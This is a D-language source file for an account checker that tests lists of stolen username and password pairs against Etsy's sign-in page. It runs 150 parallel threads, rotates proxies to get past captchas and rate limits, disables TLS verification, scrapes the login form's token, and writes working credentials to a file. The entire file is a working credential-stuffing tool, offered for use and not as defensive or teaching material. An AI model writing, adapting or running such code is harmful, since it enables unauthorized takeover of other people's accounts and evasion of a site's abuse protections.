module main;

import core.thread;
import etc.c.curl : CurlOption, CurlInfo;
import std.array;
import std.conv;
import std.file;
import std.net.curl;
import std.parallelism;
import std.regex;
import std.stdio;
import std.json;
import core.time;
import std.datetime;
import std.string;
import std.process;
import std.uri;
import std.json;
import std.exception;
import std.uni;
import std.random;
import core.memory;
import std.digest.md;
import std.stdio;

void run(string user, string pass, string proxyfile)
{
	int trys = 0;
	bool done = false;
	auto proxies = readText(proxyfile).splitLines();
	auto proxy = chomp(proxies[uniform(0, proxies.length - 1)]);
	while (!done) {
		try
		{
			if (trys >= 5 && proxy != null) {
				auto plines = readText(proxyfile).splitLines();
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
				trys = 0;
			}
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, 0);
			conn.handle.set(CurlOption.proxy, proxy);
			conn.operationTimeout(dur!"seconds"(25));
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Linux; Android 4.4.2; SCH-I545 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.38 Mobile Safari/537.36");
			string url = "https://www.etsy.com/signin";
			auto html = get(url, conn);
			
			string nnc = to!string(match(html, regex("_nnc\" value=\"(.*?)\"")).captures[1]);
			string postData = "external_account_id=&external_avatar=&external_username=&external_account_type_name=&external_name=&google_auth_code=&connect_facebook=&connect_google=&username=" ~ user ~ "&password=" ~ pass ~ "&_nnc=" ~ nnc ~ "&from_page=https%3A%2F%2Fwww.etsy.com%2F&from_action=";
			html = post(url, postData, conn);
			if (html.indexOf("Password was incorrect") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}
			else if (html.indexOf("Please type the text from the image:") != -1)
			{
				writeln("Captcha!");
				auto plines = readText(proxyfile).splitLines();
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
			} 
			else if (html.indexOf("Sign Out") != -1)
			{
				working = true;
			}
			else
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}
			
			if (working)
			{
				std.file.append("./Artfire Working.txt", user ~ ":" ~ pass ~ "\r\n");
				return;
			}
		} catch (CurlException e) {
			auto plines = readText(proxyfile).splitLines();
			proxy = chomp(plines[uniform(0, plines.length - 1)]);
		}
		trys += 1;
	}
}

void startRun()
{
	int threads = 150;
	auto accounts = readText("./accounts.txt").splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") == -1 && account.indexOf("+") == -1)
		{
			auto arr = split(account, ":");

			run(normalize(to!string(chomp(arr[0]))), normalize(to!string(chomp(arr[1]))), "./proxies.txt");
		}
	}
}


void main(string[] args)
{
	startRun();
}

